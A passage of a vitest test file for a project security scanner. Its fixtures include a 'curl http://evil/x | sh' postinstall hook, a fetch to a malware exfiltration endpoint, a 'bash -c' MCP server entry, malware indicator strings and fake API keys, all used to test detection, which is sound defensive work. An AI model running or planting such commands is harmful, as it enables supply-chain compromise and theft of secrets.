import { describe, it, expect } from 'vitest';
import {
  probeSecrets,
  probeNextPublic,
  probeSupabaseRLS,
  probeFirebaseRules,
  probePackageJson,
  probeEnvFiles,
  probeAuthWeakness,
  probeAdminRoutes,
  probeMissingHeaders,
  probeCORS,
  probeLLMSecurity,
  probeWebhookValidation,
  probeGitHubActions,
  probeClientAuthStorage,
  probeSSRFOpenRedirect,
  probeAPIRouteAuth,
  probeCompromisedPackages,
  probeSlopsquatting,
  probeMCPSecurity,
  probeTrojanSource,
  probeMaliciousArtifacts,
  probeAICodeSmells,
  probeNpmrcHygiene,
  probeExternalURLs,
  probeHTML,
  probeSEOHygiene,
  probeGEOHygiene,
  probeA11yLandmarks,
  probeCodeQuality,
  probeArchitecture,
  classifyProject,
  PROBES,
} from '../App.jsx';

const file = (path, content) => ({ path, content });

describe('PROBES registry', () => {
  it('every probe has a name and a callable fn', () => {
    expect(PROBES.length).toBeGreaterThan(20);
    PROBES.forEach((p) => {
      expect(typeof p.name).toBe('string');
      expect(typeof p.fn).toBe('function');
    });
  });

  it('every probe returns an array on empty input', () => {
    PROBES.forEach((p) => {
      expect(Array.isArray(p.fn([]))).toBe(true);
    });
  });
});

// Fixtures use runtime string concatenation so the SOURCE doesn't contain literal
// secret-shaped patterns (GitHub secret scanning would block the push). The probes
// match the concatenated runtime value, so behavior is identical.
const FAKE_AWS = 'AKIA' + 'IOSFODNN7' + 'EXAMPLE';
const FAKE_STRIPE_LIVE = 'sk_li' + 've_' + 'abcdefghijklmnopqrstuvwx';
const FAKE_STRIPE_LIVE_LONG = 'sk_li' + 've_' + 'a'.repeat(24);
const FAKE_OPENAI = 'sk-pr' + 'oj-' + 'a'.repeat(50);
const FAKE_ANTHROPIC = 'sk-' + 'ant-' + 'a'.repeat(50);
const FAKE_PEM_HEADER = '-----' + 'BEGIN RSA PRIVATE KEY' + '-----';

describe('probeSecrets', () => {
  it('detects an AWS access key', () => {
    const f = probeSecrets([file('config.js', `const k = "${FAKE_AWS}"`)]);
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe('critical');
    expect(f[0].title).toMatch(/AWS Access Key/);
    // Evidence must mask the secret.
    expect(f[0].evidence).not.toContain(FAKE_AWS);
  });

  it('detects a Stripe live secret key', () => {
    const f = probeSecrets([file('s.js', FAKE_STRIPE_LIVE)]);
    expect(f.find((x) => x.title.includes('Stripe Live'))).toBeDefined();
  });

  it('detects an OpenAI API key', () => {
    const f = probeSecrets([file('s.js', `const k = "${FAKE_OPENAI}"`)]);
    expect(f.find((x) => x.title.includes('OpenAI'))).toBeDefined();
  });

  it('detects an Anthropic API key', () => {
    const f = probeSecrets([file('s.js', FAKE_ANTHROPIC)]);
    expect(f.find((x) => x.title.includes('Anthropic'))).toBeDefined();
  });

  it('detects a private key block', () => {
    const f = probeSecrets([file('id.pem', FAKE_PEM_HEADER)]);
    expect(f.find((x) => x.title.includes('Private Key'))).toBeDefined();
  });

  it('returns nothing on clean code', () => {
    expect(probeSecrets([file('clean.js', 'const x = 1; // nothing here')])).toEqual([]);
  });
});

describe('probeNextPublic', () => {
  it('flags NEXT_PUBLIC_*_SECRET', () => {
    const f = probeNextPublic([file('.env.local', 'NEXT_PUBLIC_API_SECRET=hunter2')]);
    expect(f.length).toBe(1);
    expect(f[0].severity).toBe('critical');
  });

  it('flags NEXT_PUBLIC value that looks like a Stripe live key', () => {
    const f = probeNextPublic([file('.env', `NEXT_PUBLIC_PUB=${FAKE_STRIPE_LIVE_LONG}`)]);
    expect(f.length).toBe(1);
  });

  it('does not flag innocuous NEXT_PUBLIC values', () => {
    const f = probeNextPublic([file('.env', 'NEXT_PUBLIC_API_URL=https://api.example.com')]);
    expect(f).toEqual([]);
  });

  it('ignores files outside .env / next.config', () => {
    expect(probeNextPublic([file('app.js', 'NEXT_PUBLIC_SECRET=foo')])).toEqual([]);
  });
});

describe('probeSupabaseRLS', () => {
  it('flags table without ENABLE ROW LEVEL SECURITY', () => {
    const sql = `create table public.users (id int);`;
    const f = probeSupabaseRLS([file('migrations/001.sql', sql)]);
    expect(f).toHaveLength(1);
    expect(f[0].title).toMatch(/users/);
    expect(f[0].severity).toBe('critical');
  });

  it('does NOT flag a table that has RLS enabled', () => {
    const sql = `create table public.users (id int);
alter table public.users enable row level security;`;
    expect(probeSupabaseRLS([file('migrations/001.sql', sql)])).toEqual([]);
  });

  // REGRESSION: agent finding — capitalized "Users" used to evade the lowercase-only [a-z_] capture.
  it('REGRESSION: flags CREATE TABLE "Users" (capitalized, double-quoted)', () => {
    const sql = `CREATE TABLE "Users" (id uuid);`;
    const f = probeSupabaseRLS([file('migrations/001.sql', sql)]);
    expect(f).toHaveLength(1);
    expect(f[0].title).toMatch(/Users/);
  });

  it('REGRESSION: flags non-public schema-qualified tables', () => {
    const sql = `CREATE TABLE app.orders (id int);`;
    const f = probeSupabaseRLS([file('migrations/001.sql', sql)]);
    expect(f).toHaveLength(1);
    expect(f[0].title).toMatch(/orders/);
  });

  it('flags a permissive USING (true) policy', () => {
    const sql = `create table public.users (id int);
alter table public.users enable row level security;
create policy p on public.users for select using (true);`;
    const f = probeSupabaseRLS([file('migrations/001.sql', sql)]);
    expect(f.find((x) => x.title.includes('Permissive'))).toBeDefined();
  });
});

describe('probeFirebaseRules', () => {
  it('flags allow read: if true', () => {
    const f = probeFirebaseRules([file('firestore.rules', 'allow read: if true;')]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
  });

  it('flags storage rule that only checks auth presence', () => {
    const f = probeFirebaseRules([file('storage.rules', 'allow read: if request.auth != null;')]);
    expect(f.find((x) => x.title.includes('any authenticated'))).toBeDefined();
  });
});

describe('probePackageJson', () => {
  it('flags suspicious postinstall scripts', () => {
    const pkg = JSON.stringify({ scripts: { postinstall: 'curl http://evil/x | sh' } });
    const f = probePackageJson([file('package.json', pkg)]);
    expect(f.length).toBeGreaterThanOrEqual(1);
  });

  it('flags non-registry git deps', () => {
    const pkg = JSON.stringify({ dependencies: { foo: 'git+https://example.com/foo.git' } });
    const f = probePackageJson([file('package.json', pkg)]);
    expect(f.find((x) => x.title.includes('Non-registry'))).toBeDefined();
  });

  it('flags floating versions', () => {
    const pkg = JSON.stringify({ dependencies: { foo: '*' } });
    const f = probePackageJson([file('package.json', pkg)]);
    expect(f.find((x) => x.title.includes('Unpinned'))).toBeDefined();
  });

  it('handles malformed JSON gracefully', () => {
    expect(() => probePackageJson([file('package.json', '{ broken')])).not.toThrow();
    expect(probePackageJson([file('package.json', '{ broken')])).toEqual([]);
  });
});

describe('probeEnvFiles', () => {
  it('flags real .env files', () => {
    const f = probeEnvFiles([file('.env', 'X=1')]);
    expect(f).toHaveLength(1);
  });

  it('does not flag .env.example', () => {
    expect(probeEnvFiles([file('.env.example', 'X=placeholder')])).toEqual([]);
  });
});

describe('probeAuthWeakness', () => {
  it('flags algorithm: "none"', () => {
    const f = probeAuthWeakness([file('a.js', `jwt.sign({}, "", { algorithm: 'none' })`)]);
    expect(f.find((x) => x.title.includes('algorithm "none"'))).toBeDefined();
  });

  it('flags eval()', () => {
    const f = probeAuthWeakness([file('a.js', `eval("1+1")`)]);
    expect(f.find((x) => x.title.includes('eval()'))).toBeDefined();
  });

  // REGRESSION: agent finding — `// TODO: never use eval()` in a comment used to fire.
  it('REGRESSION: ignores eval() inside line comments', () => {
    const f = probeAuthWeakness([file('a.js', `// TODO: never use eval() here`)]);
    expect(f.find((x) => x.title.includes('eval()'))).toBeUndefined();
  });

  it('REGRESSION: ignores eval() inside block comments', () => {
    const f = probeAuthWeakness([file('a.js', `/* eval() is bad */ const x = 1;`)]);
    expect(f.find((x) => x.title.includes('eval()'))).toBeUndefined();
  });

  // REGRESSION: agent finding — unquoted `algorithm: none` used to evade.
  it('REGRESSION: catches unquoted algorithm: none', () => {
    const f = probeAuthWeakness([file('a.js', `jwt.verify(token, key, { algorithm: none })`)]);
    expect(f.find((x) => x.title.includes('algorithm "none"'))).toBeDefined();
  });
});

describe('probeAdminRoutes', () => {
  it('flags admin route with client-only auth', () => {
    const f = probeAdminRoutes([file('app/admin/page.tsx', 'const u = useUser();')]);
    expect(f).toHaveLength(1);
  });

  it('does not flag admin route with server check', () => {
    const f = probeAdminRoutes([
      file('app/admin/page.tsx', 'const session = await getServerSession(); const u = useUser();'),
    ]);
    expect(f).toEqual([]);
  });
});

describe('probeMissingHeaders', () => {
  it('flags next.config without headers function', () => {
    const f = probeMissingHeaders([
      file('next.config.js', 'export default { reactStrictMode: true }'),
    ]);
    expect(f).toHaveLength(1);
  });

  it('does not flag if headers() is present', () => {
    const f = probeMissingHeaders([
      file('next.config.js', 'export default { async headers() { return [] } }'),
    ]);
    expect(f).toEqual([]);
  });
});

describe('probeCORS', () => {
  it('flags wildcard CORS in object-literal form', () => {
    const f = probeCORS([file('h.ts', `res.setHeader("Access-Control-Allow-Origin", "*");`)]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('medium');
  });

  it('flags wildcard CORS in headers map', () => {
    const f = probeCORS([file('h.ts', `const headers = { "Access-Control-Allow-Origin": "*" };`)]);
    expect(f).toHaveLength(1);
  });

  it('does not flag when origin is a real domain', () => {
    const f = probeCORS([
      file('h.ts', `res.setHeader("Access-Control-Allow-Origin", "https://example.com");`),
    ]);
    expect(f).toEqual([]);
  });
});

describe('probeLLMSecurity', () => {
  it('flags PythonREPL agent tool', () => {
    const f = probeLLMSecurity([file('agent.ts', 'import { PythonREPL } from "langchain"')]);
    expect(f.find((x) => x.title.includes('PythonREPL'))).toBeDefined();
  });

  it('flags client-side OpenAI call', () => {
    const f = probeLLMSecurity([
      file('components/Chat.tsx', `'use client'\nawait openai.chat.completions.create({})`),
    ]);
    expect(f.find((x) => x.title.includes('client component'))).toBeDefined();
  });
});

describe('probeWebhookValidation', () => {
  it('flags Stripe webhook without signature verification', () => {
    const f = probeWebhookValidation([
      file(
        'app/webhook/stripe/route.ts',
        `import Stripe from 'stripe'; const body = await req.text();`
      ),
    ]);
    expect(f.find((x) => x.title.includes('Stripe webhook'))).toBeDefined();
  });
});

describe('probeGitHubActions', () => {
  it('flags pull_request_target with checkout of head ref', () => {
    const yml = `on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.ref }}`;
    const f = probeGitHubActions([file('.github/workflows/ci.yml', yml)]);
    expect(f.find((x) => x.title.includes('pull_request_target'))).toBeDefined();
  });

  it('flags actions pinned to floating tags', () => {
    const yml = `jobs:\n  a:\n    steps:\n      - uses: actions/checkout@main`;
    const f = probeGitHubActions([file('.github/workflows/ci.yml', yml)]);
    expect(f.find((x) => x.title.includes('mutable ref'))).toBeDefined();
  });
});

describe('probeClientAuthStorage', () => {
  it('flags localStorage.setItem of a token', () => {
    const f = probeClientAuthStorage([file('a.ts', `localStorage.setItem('auth_token', t)`)]);
    expect(f).toHaveLength(1);
  });
});

describe('probeSSRFOpenRedirect', () => {
  it('flags redirect with user input', () => {
    const f = probeSSRFOpenRedirect([file('a.ts', `res.redirect(req.query.next)`)]);
    expect(f.find((x) => x.title.includes('Redirect'))).toBeDefined();
  });

  it('flags fetch with user-controlled URL', () => {
    const f = probeSSRFOpenRedirect([file('a.ts', `fetch(req.body.url)`)]);
    expect(f.find((x) => x.title.includes('Server-side fetch'))).toBeDefined();
  });
});

describe('probeAPIRouteAuth', () => {
  it('flags admin API route without auth', () => {
    const f = probeAPIRouteAuth([
      file(
        'app/api/admin/users/route.ts',
        `export async function POST(req) { return Response.json({}); }`
      ),
    ]);
    expect(f.length).toBeGreaterThanOrEqual(1);
  });

  it('does not flag if getServerSession is present', () => {
    const f = probeAPIRouteAuth([
      file(
        'app/api/admin/users/route.ts',
        `export async function POST(req) { const s = await getServerSession(); return Response.json({}); }`
      ),
    ]);
    expect(f).toEqual([]);
  });

  // REGRESSION: agent finding — jwt.verify(token) without a secret used to satisfy hasAuth, suppressing
  // a critical finding while probeAuthWeakness simultaneously flagged the same call as broken.
  it('REGRESSION: jwt.verify(token) without a secret does NOT count as auth', () => {
    const f = probeAPIRouteAuth([
      file(
        'app/api/admin/users/route.ts',
        `export async function DELETE(req) {
         const token = req.headers.get('authorization');
         const decoded = jwt.verify(token);  // no secret arg!
         return Response.json({ ok: true });
       }`
      ),
    ]);
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(
      f.some(
        (x) =>
          x.title.toLowerCase().includes('without auth') ||
          x.title.toLowerCase().includes('destructive')
      )
    ).toBe(true);
  });

  it('jwt.verify(token, secret) DOES count as auth', () => {
    const f = probeAPIRouteAuth([
      file(
        'app/api/admin/users/route.ts',
        `export async function DELETE(req) {
         const decoded = jwt.verify(token, process.env.JWT_SECRET);
         return Response.json({ ok: true });
       }`
      ),
    ]);
    expect(f).toEqual([]);
  });
});

describe('probeCompromisedPackages', () => {
  it('flags axios@1.14.1', () => {
    const pkg = JSON.stringify({ dependencies: { axios: '1.14.1' } });
    const f = probeCompromisedPackages([file('package.json', pkg)]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
  });

  it('flags @bitwarden/cli@2026.4.0', () => {
    const pkg = JSON.stringify({ dependencies: { '@bitwarden/cli': '2026.4.0' } });
    expect(probeCompromisedPackages([file('package.json', pkg)])).toHaveLength(1);
  });

  it('does not flag clean axios', () => {
    const pkg = JSON.stringify({ dependencies: { axios: '1.7.2' } });
    expect(probeCompromisedPackages([file('package.json', pkg)])).toEqual([]);
  });

  // Mini Shai-Hulud TanStack (May 11, 2026)
  it('flags @tanstack/react-router@1.169.5 (Mini Shai-Hulud)', () => {
    const pkg = JSON.stringify({ dependencies: { '@tanstack/react-router': '1.169.5' } });
    const f = probeCompromisedPackages([file('package.json', pkg)]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
    expect(f[0].evidence).toMatch(/Mini Shai-Hulud/i);
  });

  it('flags @tanstack/react-router@1.169.8 (second poisoned version)', () => {
    const pkg = JSON.stringify({ dependencies: { '@tanstack/react-router': '1.169.8' } });
    expect(probeCompromisedPackages([file('package.json', pkg)])).toHaveLength(1);
  });

  it('does not flag clean @tanstack/react-router (post-rotation version)', () => {
    const pkg = JSON.stringify({ dependencies: { '@tanstack/react-router': '1.169.9' } });
    expect(probeCompromisedPackages([file('package.json', pkg)])).toEqual([]);
  });

  it('flags @mistralai/mistralai@2.2.4 (Mini Shai-Hulud cross-scope)', () => {
    const pkg = JSON.stringify({ dependencies: { '@mistralai/mistralai': '2.2.4' } });
    const f = probeCompromisedPackages([file('package.json', pkg)]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
  });

  it('flags @opensearch-project/opensearch@3.5.3', () => {
    const pkg = JSON.stringify({
      dependencies: { '@opensearch-project/opensearch': '3.5.3' },
    });
    expect(probeCompromisedPackages([file('package.json', pkg)])).toHaveLength(1);
  });
});

describe('probeMaliciousArtifacts', () => {
  // File-path indicators: presence alone is critical
  it('flags .claude/router_runtime.js drop-file', () => {
    const f = probeMaliciousArtifacts([file('.claude/router_runtime.js', '// auto-generated\n')]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
    expect(f[0].title).toMatch(/router_runtime\.js/);
  });

  it('flags .claude/setup.mjs drop-file', () => {
    const f = probeMaliciousArtifacts([file('.claude/setup.mjs', '')]);
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
  });

  it('flags .vscode/setup.mjs drop-file', () => {
    const f = probeMaliciousArtifacts([file('.vscode/setup.mjs', '')]);
    expect(f).toHaveLength(1);
  });

  it('flags tanstack_runner.js at any depth', () => {
    const f = probeMaliciousArtifacts([file('src/lib/tanstack_runner.js', '')]);
    expect(f).toHaveLength(1);
  });

  it('flags router_init.js at package root', () => {
    const f = probeMaliciousArtifacts([file('router_init.js', '')]);
    expect(f).toHaveLength(1);
  });

  // String IOCs: any one is suggestive
  it('flags __DAEMONIZED guard string in any file', () => {
    const f = probeMaliciousArtifacts([
      file('src/app.js', 'if (process.env.__DAEMONIZED) { /* ... */ }'),
    ]);
    expect(f).toHaveLength(1);
    expect(f[0].evidence).toMatch(/__DAEMONIZED/);
  });

  it('flags filev2.getsession.org exfil endpoint', () => {
    const f = probeMaliciousArtifacts([
      file('payload.js', 'fetch("https://filev2.getsession.org/upload")'),
    ]);
    expect(f).toHaveLength(1);
  });

  it('flags gh-token-monitor LaunchAgent label in plist content', () => {
    const plist = `<key>Label</key><string>com.user.gh-token-monitor</string>`;
    const f = probeMaliciousArtifacts([file('Library/LaunchAgents/gh-token-monitor.plist', plist)]);
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].evidence).toMatch(/gh-token-monitor/i);
  });

  it('flags malicious @tanstack/setup commit pin', () => {
    const f = probeMaliciousArtifacts([
      file(
        'package.json',
        JSON.stringify({
          optionalDependencies: {
            '@tanstack/setup': 'github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c',
          },
        })
      ),
    ]);
    expect(f).toHaveLength(1);
  });

  it('flags spoofed Claude commit author', () => {
    const f = probeMaliciousArtifacts([
      file('CHANGELOG.md', 'Authored-by: claude@users.noreply.github.com'),
    ]);
    expect(f).toHaveLength(1);
  });

  it('does not fire on clean files', () => {
    const f = probeMaliciousArtifacts([
      file('src/app.js', 'const x = 1;'),
      file('package.json', JSON.stringify({ dependencies: { react: '^18.0.0' } })),
    ]);
    expect(f).toEqual([]);
  });

  it('skips test files (which contain IOC strings on purpose)', () => {
    const f = probeMaliciousArtifacts([
      file('src/test/probes.test.js', "expect('__DAEMONIZED').toMatch(/.+/)"),
    ]);
    expect(f).toEqual([]);
  });
});

describe('probeSlopsquatting', () => {
  it('flags known typosquats', () => {
    const pkg = JSON.stringify({ dependencies: { lodahs: '*' } });
    const f = probeSlopsquatting([file('package.json', pkg)]);
    expect(f.find((x) => x.title.toLowerCase().includes('typosquat'))).toBeDefined();
  });
});

describe('probeMCPSecurity', () => {
  it('flags MCP server that spawns bash -c', () => {
    const cfg = JSON.stringify({
      mcpServers: { evil: { command: 'bash', args: ['-c', 'echo hi'] } },
    });
    const f = probeMCPSecurity([file('.mcp.json', cfg)]);
    expect(f.find((x) => x.title.toLowerCase().includes('shell'))).toBeDefined();
  });
});

describe('probeTrojanSource', () => {
  it('flags bidi unicode characters', () => {
    const bidi = '‮';
    const f = probeTrojanSource([file('a.js', `const safe = "${bidi}// hidden";`)]);
    expect(f).toHaveLength(1);
  });
});

describe('probeAICodeSmells', () => {
  it('counts empty catch blocks', () => {
    const f = probeAICodeSmells([
      file('a.ts', 'try { do(); } catch {}\ntry { x(); } catch (e) {}'),
    ]);
    expect(f.find((x) => x.title.includes('empty catch'))).toBeDefined();
  });
});

describe('probeExternalURLs', () => {
  it('flags an unknown domain referenced in source', () => {
    const f = probeExternalURLs([
      { path: 'src/api.ts', content: 'fetch("https://dasgas.com/api/x")' },
    ]);
    expect(f).toHaveLength(1);
    expect(f[0].title).toMatch(/dasgas\.com/);
    expect(f[0].remediation).toMatch(/virustotal\.com/);
  });

  it('escalates suspicious TLDs to medium', () => {
    const f = probeExternalURLs([{ path: 'a.ts', content: 'fetch("https://something.tk/x")' }]);
    expect(f[0].severity).toBe('medium');
    expect(f[0].title).toMatch(/Suspicious TLD/);
  });

  it('escalates raw IPs to medium', () => {
    // Use a non-reserved IP: 203.0.113.0/24 is RFC 5737 (documentation) so the probe
    // now treats it as a placeholder and skips it. 1.2.3.4 is real-looking enough.
    const f = probeExternalURLs([{ path: 'a.ts', content: 'fetch("http://1.2.3.4/x")' }]);
    expect(f[0].severity).toBe('medium');
    expect(f[0].title).toMatch(/Raw IP/);
  });

  it('skips RFC 5737 reserved IPs (documentation placeholders)', () => {
    const f = probeExternalURLs([
      { path: 'a.ts', content: 'fetch("http://203.0.113.5/x")' },
      { path: 'b.ts', content: 'fetch("http://192.0.2.10/x")' },
      { path: 'c.ts', content: 'fetch("http://198.51.100.7/x")' },
    ]);
    expect(f.find((x) => /203\.0\.113|192\.0\.2|198\.51\.100/.test(x.title))).toBeUndefined();
  });

  it('skips placeholder hosts (example.com, yourdomain.com, etc.)', () => {
    const f = probeExternalURLs([
      { path: 'docs.md', content: 'See https://example.com or https://yourdomain.com.' },
    ]);
    expect(f).toEqual([]);
  });

  it('skips URLs that live inside a remediation: string literal', () => {
    const code = `const finding = { remediation: 'Visit https://docs.unrelated-vendor.com/help' };`;
    const f = probeExternalURLs([{ path: 'src/probe.js', content: code }]);
    expect(f).toEqual([]);
  });

  it('skips self-domains derived from package.json#homepage', () => {
    const f = probeExternalURLs([
      { path: 'package.json', content: '{ "homepage": "https://myapp.example.io" }' },
      { path: 'src/foo.js', content: 'fetch("https://myapp.example.io/api")' },
    ]);
    expect(f).toEqual([]);
  });

  it('skips meta/doc files (llms.txt, robots.txt, sitemap.xml, .preflight.yml)', () => {
    // These files are *expected* to enumerate URLs as content — flagging them is pure noise.
    const f = probeExternalURLs([
      { path: 'public/llms.txt', content: 'See https://dasgas.com for one example.' },
      { path: 'public/robots.txt', content: 'Sitemap: https://dasgas.com/sitemap.xml' },
      { path: 'public/sitemap.xml', content: '<loc>https://dasgas.com/page</loc>' },
      { path: '.preflight.yml', content: "reason: 'fix per https://dasgas.com/advisory'" },
    ]);
    expect(f).toEqual([]);
  });

  it('flags URL shorteners', () => {
    const f = probeExternalURLs([{ path: 'a.ts', content: 'fetch("https://bit.ly/abc123")' }]);
    expect(f[0].title).toMatch(/shortener/i);
    expect(f[0].severity).toBe('medium');
  });

  it('flags HTTP-only URLs at low', () => {
    const f = probeExternalURLs([
      { path: 'a.ts', content: 'fetch("http://api.somecompany.example.io/x")' },
    ]);
    expect(f[0].severity).toBe('low');
  });

  it('skips localhost, github, npm, googleapis, and other safe hosts', () => {
    const code = `
      const a = "https://github.com/foo/bar";
      const b = "https://api.openai.com/v1";
      const c = "http://localhost:3000";
      const d = "https://fonts.googleapis.com/css2";
      const e = "https://supabase.co";
      const f = "https://cdn.jsdelivr.net/npm/x";
    `;
    expect(probeExternalURLs([{ path: 'a.ts', content: code }])).toEqual([]);
  });

  it('groups multiple references to the same host into one finding', () => {
    const f = probeExternalURLs([
      { path: 'a.ts', content: 'fetch("https://dasgas.com/a")' },
      { path: 'b.ts', content: 'fetch("https://dasgas.com/b")\nfetch("https://dasgas.com/c")' },
    ]);
    expect(f).toHaveLength(1);
    expect(f[0].title).toMatch(/×3/);
  });

  it('skips lockfiles to avoid noise', () => {
    const lock = JSON.stringify({
      packages: { 'node_modules/x': { resolved: 'https://registry.somecdn.example.io/x.tgz' } },
    });
    expect(probeExternalURLs([{ path: 'package-lock.json', content: lock }])).toEqual([]);
  });
});

describe('probeHTML', () => {
  it('flags inline onclick handlers', () => {
    const f = probeHTML([file('index.html', '<button onclick="alert(1)">go</button>')]);
    expect(f.find((x) => x.title.toLowerCase().includes('inline event'))).toBeDefined();
  });

  it('flags target="_blank" without rel="noopener"', () => {
    const f = probeHTML([file('index.html', '<a href="https://x.com" target="_blank">x</a>')]);
    expect(f.find((x) => x.title.includes('noopener'))).toBeDefined();
  });

  it('does NOT flag target="_blank" WITH rel="noopener"', () => {
    const f = probeHTML([
      file('index.html', '<a href="https://x.com" target="_blank" rel="noopener noreferrer">x</a>'),
    ]);
    expect(f.find((x) => x.title.includes('noopener'))).toBeUndefined();
  });

  it('flags http:// script srcs (mixed content)', () => {
    const f = probeHTML([
      file('index.html', '<script src="http://cdn.example.com/x.js"></script>'),
    ]);
    expect(f.find((x) => x.title.includes('mixed-content'))).toBeDefined();
  });

  it('flags eval() inside <script>', () => {
    const f = probeHTML([file('index.html', '<script>eval(localStorage.x)</script>')]);
    expect(f.find((x) => x.title.includes('eval()'))).toBeDefined();
  });

  it('flags form posts over http://', () => {
    const f = probeHTML([
      file('index.html', '<form action="http://example.com/submit">...</form>'),
    ]);
    expect(f.find((x) => x.title.includes('http:// endpoint'))).toBeDefined();
  });

  it('flags inline <script> with no CSP meta tag', () => {
    const f = probeHTML([
      file('index.html', '<html><head></head><body><script>console.log(1)</script></body></html>'),
    ]);
    expect(f.find((x) => x.title.includes('Content-Security-Policy'))).toBeDefined();
  });

  it('does NOT flag inline <script> when CSP meta tag present', () => {
    const html = `<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head><body><script>x()</script></body></html>`;
    const f = probeHTML([file('index.html', html)]);
    expect(f.find((x) => x.title.includes('Content-Security-Policy'))).toBeUndefined();
  });

  it('ignores non-HTML files', () => {
    expect(probeHTML([file('app.tsx', '<button onclick="x"/>')])).toEqual([]);
  });
});

describe('probeSEOHygiene', () => {
  const entryHtml = (head, body = '<div id="root"></div>') =>
    file(
      'index.html',
      `<!doctype html><html lang="en"><head>${head}</head><body>${body}</body></html>`
    );

  it('flags missing <title>', () => {
    const f = probeSEOHygiene([
      entryHtml(
        '<meta name="description" content="a description that is plenty long enough to pass the threshold check easily">'
      ),
    ]);
    expect(f.find((x) => x.title.includes('<title>'))).toBeDefined();
  });

  it('flags missing meta description', () => {
    const f = probeSEOHygiene([entryHtml('<title>Some App</title>')]);
    expect(f.find((x) => x.title.includes('description'))).toBeDefined();
  });

  it('flags missing canonical', () => {
    const f = probeSEOHygiene([
      entryHtml(
        '<title>X</title><meta name="description" content="a description that is plenty long enough to pass the threshold check easily">'
      ),
    ]);
    expect(f.find((x) => x.title.includes('canonical'))).toBeDefined();
  });

  it('flags <html> without lang', () => {
    const html = `<!doctype html><html><head><title>X</title></head><body><div id="root"></div></body></html>`;
    const f = probeSEOHygiene([file('index.html', html)]);
    expect(f.find((x) => x.title.includes('lang'))).toBeDefined();
  });

  it('flags robots.txt without Sitemap line', () => {
    const f = probeSEOHygiene([file('robots.txt', 'User-agent: *\nAllow: /')]);
    expect(f.find((x) => x.title.includes('Sitemap'))).toBeDefined();
  });

  it('does NOT flag robots.txt that has Sitemap line', () => {
    const f = probeSEOHygiene([
      file('robots.txt', 'User-agent: *\nAllow: /\nSitemap: https://x.com/sitemap.xml'),
    ]);
    expect(f).toEqual([]);
  });

  it('flags a full Disallow: / as critical', () => {
    const f = probeSEOHygiene([file('robots.txt', 'User-agent: *\nDisallow: /')]);
    expect(f.find((x) => x.severity === 'critical')).toBeDefined();
  });
});

describe('probeGEOHygiene', () => {
  const entryHtml = (head) =>
    file(
      'index.html',
      `<!doctype html><html lang="en"><head>${head}</head><body><div id="root"></div></body></html>`
    );

  it('flags missing llms.txt when project has HTML', () => {
    const f = probeGEOHygiene([entryHtml('<title>X</title>')]);
    expect(f.find((x) => x.title.includes('llms.txt'))).toBeDefined();
  });

  it('does NOT flag missing llms.txt when llms.txt is present', () => {
    const f = probeGEOHygiene([
      entryHtml('<title>X</title><time dateTime="2026-05-11">Updated</time>'),
      file('llms.txt', '# Project'),
    ]);
    expect(f.find((x) => x.title.includes('llms.txt'))).toBeUndefined();
  });

  it('flags robots.txt that explicitly Disallows an AI crawler', () => {
    const robots = `User-agent: GPTBot\nDisallow: /\n`;
    const f = probeGEOHygiene([
      file('robots.txt', robots),
      file('llms.txt', '# x'),
      entryHtml('<title>X</title>'),
    ]);
    expect(f.find((x) => x.title.includes('GPTBot'))).toBeDefined();
  });

  it('flags missing freshness signal', () => {
    const f = probeGEOHygiene([entryHtml('<title>X</title>'), file('llms.txt', '# x')]);
    expect(f.find((x) => x.title.toLowerCase().includes('freshness'))).toBeDefined();
  });

  it('does NOT flag freshness when <time datetime> is present', () => {
    const html = `<html lang="en"><head><title>X</title></head><body><div id="root"></div><time dateTime="2026-05-11">Updated</time></body></html>`;
    const f = probeGEOHygiene([file('index.html', html), file('llms.txt', '# x')]);
    expect(f.find((x) => x.title.toLowerCase().includes('freshness'))).toBeUndefined();
  });

  it('flags FAQPage schema with no visible FAQ in DOM', () => {
    const html = `<!doctype html><html lang="en"><head>
      <title>X</title>
      <script type="application/ld+json">{"@type":"FAQPage","mainEntity":[]}</script>
    </head><body><div id="root"></div><time dateTime="2026-05-11">x</time></body></html>`;
    const f = probeGEOHygiene([file('index.html', html), file('llms.txt', '# x')]);
    expect(f.find((x) => x.title.toLowerCase().includes('faqpage'))).toBeDefined();
  });
});

describe('probeA11yLandmarks', () => {
  it('flags <img> without alt', () => {
    const f = probeA11yLandmarks([file('index.html', '<img src="/x.png">')]);
    expect(f.find((x) => x.title.includes('alt'))).toBeDefined();
  });

  it('does NOT flag <img alt="">', () => {
    const f = probeA11yLandmarks([file('index.html', '<img src="/x.png" alt="">')]);
    expect(f.find((x) => x.title.includes('alt'))).toBeUndefined();
  });

  it('flags <html> without lang', () => {
    const f = probeA11yLandmarks([file('index.html', '<html><body></body></html>')]);
    expect(f.find((x) => x.title.includes('lang'))).toBeDefined();
  });

  it('flags <input type="text"> without label/aria', () => {
    const f = probeA11yLandmarks([file('index.html', '<input type="text" />')]);
    expect(f.find((x) => x.title.includes('label'))).toBeDefined();
  });

  it('does NOT flag input with associated <label for>', () => {
    const f = probeA11yLandmarks([
      file(
        'index.html',
        '<html lang="en"><body><label for="x">Name</label><input id="x" type="text" /></body></html>'
      ),
    ]);
    expect(f.find((x) => x.title.includes('label'))).toBeUndefined();
  });

  it('does NOT flag input with aria-label', () => {
    const f = probeA11yLandmarks([
      file(
        'index.html',
        '<html lang="en"><body><input type="text" aria-label="Email" /></body></html>'
      ),
    ]);
    expect(f.find((x) => x.title.includes('label'))).toBeUndefined();
  });

  it('flags missing skip-link', () => {
    const f = probeA11yLandmarks([
      file('index.html', '<html lang="en"><body><h1>x</h1></body></html>'),
    ]);
    expect(f.find((x) => x.title.toLowerCase().includes('skip'))).toBeDefined();
  });

  it('flags icon-only React button without aria-label', () => {
    const code = `<button onClick={x}><Trash size={12} /></button>`;
